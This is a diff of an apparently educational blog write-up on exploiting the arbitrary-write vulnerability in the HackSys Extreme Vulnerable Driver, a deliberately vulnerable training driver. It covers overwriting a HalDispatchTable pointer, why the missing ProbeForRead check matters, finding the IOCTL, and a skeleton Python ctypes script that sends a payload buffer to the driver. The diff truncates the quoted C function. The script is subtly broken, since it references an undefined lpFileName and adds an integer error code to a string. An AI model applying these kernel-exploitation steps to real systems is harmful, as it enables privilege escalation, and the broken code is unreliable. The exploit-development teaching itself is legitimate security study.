@@ -29,7 +29,7 @@ The HalDispatchTable is responsible for acting as a table which holds function p
 
 With our arbitrary write vulnerability, we can write a controlled payload address to a controlled memory location in the kernel. 
 
-With our Arbitrary Write we need to find a good place to write to. We are going to overwrite a pointer that resides in the HalDispatchTable, specifically we want to utilize the `HalDispatchTable` since we can invoke and call it from a user-mode perspective, we can call aspects of the `HalDispatchTable` via the undocumented function `NtQueryIntervalProfile`
+With our Arbitrary Write, we need to find a good place to write to. We are going to overwrite a pointer that resides in the HalDispatchTable, specifically we want to utilize the `HalDispatchTable` since we can invoke and call it from a user-mode perspective, we can call aspects of the `HalDispatchTable` via the undocumented function `NtQueryIntervalProfile`
 
 ```c++
 NTSTATUS 
@@ -74,25 +74,63 @@ Our exploitation workflow is as follows
         // pointed by 'Where' without properly validating if the values pointed by 'Where'
         // and 'What' resides in User mode
         *(Where) = *(What);
-#endif
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER) {
-        Status = GetExceptionCode();
-        DbgPrint("[-] Exception Code: 0x%X\n", Status);
-    }
 
-    return Status;
-}
 ```
 
+The vulnerability here is being shown really well, the issue is the lack of validation of the two pointers `Where` and `What` on the line `*(Where) = *(What);`. It's not properly validating where the pointer values reside. In the secure version of the function, it's utilizing the `ProbeForRead` function which is a routine that checks that a user-mode buffer is actually residing in the user portion of the address space. 
+
+```c++
+void ProbeForRead(
+  const volatile VOID *Address,
+  SIZE_T              Length,
+  ULONG               Alignment
+);
+```
+
+The provided parameters that are given by this secure function is the address of the beginning of the user-mode buffer the size and length of the buffer, and it's also specifying the required alignment.
 
 ### IOCTL discovery & driver communication
 
+For discovering the needed IOCTL, we can use just the provided CTL_MACRO again from the source code of the file.
+
 ![ioctl 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/hevd_www2.png)
 
+You can use this to calculate the IOCTL.
 
 ![ioctl 2](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/hevd_www3.png)
 
+Like always, there are multiple ways to capture and discover IOCTLs, feel free to use IDA for static analysis which leads to IOCTL discovery.
+
+Now that we have the needed IOCTL we can send out skeleton script with a payload to the device driver.
+
+```python
+import sys, os
+import ctypes, struct
+from ctypes import *
+ 
+def arbitrary_overwrite():
+
+    kernel32              = windll.kernel32
+    psapi                 = windll.Psapi
+    ntdll                 = windll.ntdll
+    
+    device_handle = kernel32.CreateFileA("\\\\.\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
+ 
+    if not device_handle or device_handle == -1:
+        print("[!] Error creating Device handle:" + ctypes.GetLastError())
+        sys.exit()
+    else:
+        print("[+] Device handler setup successful")
+        print("[+] Device handle in use: %s" %lpFileName)
+ 
+    buf = "A"*100
+    bufLength = len(buf)
+ 
+    kernel32.DeviceIoControl(device_handle, 0x22200b, buf, bufLength, None, 0, byref(c_ulong()), None)
+ 
+if __name__ == "__main__":
+    arbitrary_overwrite()
+```
 
 ### Get the Base Name and address from ntkrnlpa.exe
 
